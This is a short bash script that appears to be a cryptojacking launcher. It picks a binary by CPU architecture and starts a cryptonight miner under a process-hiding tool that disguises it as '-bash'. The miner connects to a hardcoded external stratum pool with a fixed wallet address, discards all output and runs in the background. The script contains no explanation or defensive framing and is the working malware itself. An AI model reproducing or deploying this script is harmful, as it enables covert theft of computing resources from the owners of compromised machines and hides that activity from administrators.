#!/bin/bash

proc=`nproc`
ARCH=`uname -m`
HIDE="-bash"

if [ "$ARCH" == "i686" ];       then
        ./h32 -s $HIDE ./md32 -a cryptonight -o stratum+tcp://107.191.99.227:3333 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRybb3kLz45H8EgLWZU -p x >>/dev/null &
elif [ "$ARCH" == "x86_64" ];   then
        ./h64 -s $HIDE ./md -a cryptonight -o stratum+tcp://107.191.99.227:3333 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRybb3kLz45H8EgLWZU -p x >>/dev/null &
                                else
        ./h64 -s $HIDE ./mdx -a cryptonight -o stratum+tcp://107.191.99.227:3333 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRybb3kLz45H8EgLWZU -p x >>/dev/null &
fi
echo $! > bash.pid
